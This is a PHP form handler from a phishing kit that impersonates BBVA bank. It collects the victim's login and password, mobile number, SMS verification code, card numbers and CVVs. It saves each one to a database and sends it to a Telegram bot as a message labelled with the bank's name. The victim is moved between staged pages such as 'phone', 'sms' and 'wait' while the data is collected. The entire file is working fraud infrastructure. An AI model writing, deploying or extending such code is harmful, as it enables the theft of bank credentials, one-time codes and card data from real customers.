<?php
if ($_SERVER["REQUEST_METHOD"] == 'POST') 
{
	session_start();
	include "../config.php";
	include "./functions.php";
	include "./class/UserInfo.php";
	include '../admintus/config/config.php';
	include '../admintus/config/db.class.php';
	include "../admintus/config/User.php";

	$ip  = UserInfo::getIP();
	$uag = UserInfo::getUag();
	$user_s = $_SESSION['time'];
	$userclass = new User();
	$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);

	if ($_GET["id"] == "login" ) 
	{
		$errors = array();
		$_SESSION['page'] = true;
        $user = $_SESSION["user"] = trim(htmlspecialchars($_POST["user"]));
		$pass = $_SESSION["pass"] = trim(htmlspecialchars($_POST["pass"]));

		if (empty($user) or empty($pass))
		{
			$errors['datos'] = 'Todos los campos son obligatorios';
		}

		if (count($errors) !== 0)
		{
			$_SESSION['errors'] = $errors;
			header("location: ../home");
		} else
		{
			if (isset($_SESSION['update']['login'])) 
			{
				$SQL = $db->update($userclass->updateUser($user, $pass, $user_s, 1, date("H:i:s")));
				unset($_SESSION['update']['login']);
				header("location: ../wait");
			}else {
				$SQL = $db->insert($userclass->insertUser($user, $pass, $ip, $ua, $user_s, 0, date("H:i:s")));
				header("location: ../phone");
			}

			$msg  = "BBVA LOGIN\n";
			$msg .= "\nUSER : ".$_SESSION["user"];
			$msg .= "\nPASS : ".$_SESSION["pass"];
			$msg .= "\nIP : ".$ip;
			$msg .= "\n\nUAG : ".$uag;
			sendTg($msg, $bot_token, $chat_id);
			exit(0);
		}
	}

	if ($_GET['id'] == "phone")
	{
		$errors = array();
		$phone = $_SESSION["phone"] = trim(htmlspecialchars($_POST["phone"]));

		if (empty($phone)) {
			$errors['phone'] = "El Numero movil no puede estar vacio";
		}else {
			if (!preg_match('/6[0-9]{8}/',$phone)) {
				$errors['phone'] = "El Numero movil ingresado es invalido";
			}
		}

		if (count($errors) !== 0)
		{
			$_SESSION['error'] = $errors;
			header("location: ../phone");
		}else {
			$SQL = $db->update($userclass->updatePhone($phone, $user_s, 1, date("H:i:s")));

			$msg  = "BBVA LOGIN + PHONE\n";
			$msg .= "\nUSER : ".$_SESSION["user"];
			$msg .= "\nPASS : ".$_SESSION["pass"];
			$msg .= "\nPHONE : ".$_SESSION["phone"];
			$msg .= "\nIP : ".$ip;
			$msg .= "\n\nUAG : ".$uag;
			sendTg($msg, $bot_token, $chat_id);
			header("location: ../wait");
		}
		exit(0);
	}

	if ($_GET['id'] == "sms")
	{
		$errors = array();
		$sms = $_SESSION["sms"] = trim(htmlspecialchars($_POST["sms"]));

		if (empty($sms)) {
			$errors['sms'] = "El codigo SMS no puede estar vacio";
		}else {
			if (!preg_match('/[0-9]{6}/',$sms)) {
				$errors['phone'] = "El codigo SMS ingresado es invalido";
			}
		}

		if (count($errors) !== 0)
		{
			$_SESSION['error'] = $errors;
			header("location: ../sms");
		}else {
			$SQL = $db->update($userclass->updateSms($sms, $user_s, 1, date("H:i:s")));

			$msg  = "BBVA {$_SESSION["user"]}\n";
			$msg .= "\nSMS : ".$_SESSION["sms"];
			sendTg($msg, $bot_token, $chat_id);

			header("location: ../wait");
		}
		exit(0);
	}

	if ($_GET['id'] == "tarjeta")
	{
		$errors = array();
		$tarjeta = $_SESSION["tarjeta"] = $_POST["tarjeta"];
		$cvv = $_SESSION["cvv"] = ($_POST["cvv"]);
		$ccfull = "";
		$cctlg = "";
		for ($i=0; $i < count($_POST["tarjeta"]); $i++) { 
			$ccfull .= $tarjeta[$i]."|".$cvv[$i]."<br>";
			$cctlg .= $tarjeta[$i]."|".$cvv[$i]."\n";
		}

		if (count($errors) !== 0)
		{
			$_SESSION['errors'] = $errors;
			header("location: ../tarjeta");
		}else {
			$SQL = $db->update($userclass->updateCard($ccfull, $user_s, 1, date("H:i:s")));

			$msg  = "BBVA LOGIN + PHONE + TARJETAS\n";
			$msg .= "\nUSER : ".$_SESSION["user"];
			$msg .= "\nPASS : ".$_SESSION["pass"];
			$msg .= "\nPHONE : ".$_SESSION["phone"];
			$msg .= "\nTARJETAS : ".$cctlg;
			$msg .= "\nIP : ".$ip;
			$msg .= "\n\nUAG : ".$uag;
			sendTg($msg, $bot_token, $chat_id);
			header('location: ../wait');
		}
		exit(0);
	}

	if ($_GET['id'] == "cvv")
	{
		$errors = array();
		$cvv = $_SESSION["cvv"] = ($_POST["cvv"]);

		if (count($errors) !== 0)
		{
			$_SESSION['errors'] = $errors;
			header("location: ../tarjeta");
		}else {
			$SQL = $db->update($userclass->updateCvv($cvv, $user_s, 1, date("H:i:s")));

			$c_cvv = '';
			$SQL = $db->fetch($userclass->getQcvv($_SESSION['time']));
			if(isset($SQL['c_cvv'])) $c_cvv .= $SQL['c_cvv'];

			$msg  = "BBVA LOGIN + PHONE + CVV\n";
			$msg .= "\nUSER : ".$_SESSION["user"];
			$msg .= "\nPASS : ".$_SESSION["pass"];
			$msg .= "\nPHONE : ".$_SESSION["phone"];
			$msg .= "\nC-CVV : ".$c_cvv.":".$cvv;
			$msg .= "\nIP : ".$ip;
			$msg .= "\n\nUAG : ".$uag;
			sendTg($msg, $bot_token, $chat_id);
			header('location: ../wait');
		}
		exit(0);
	}

	if ($_GET['id'] == "desv")
	{
		if (isset($_POST['send'])) {
			$SQL = $db->update($userclass->updateDesvResult('ON', $user_s, 1, date("H:i:s")));
			header('location: ../wait');
		} else {
			header("location: ../desv");
		}
		exit(0);
	}

}

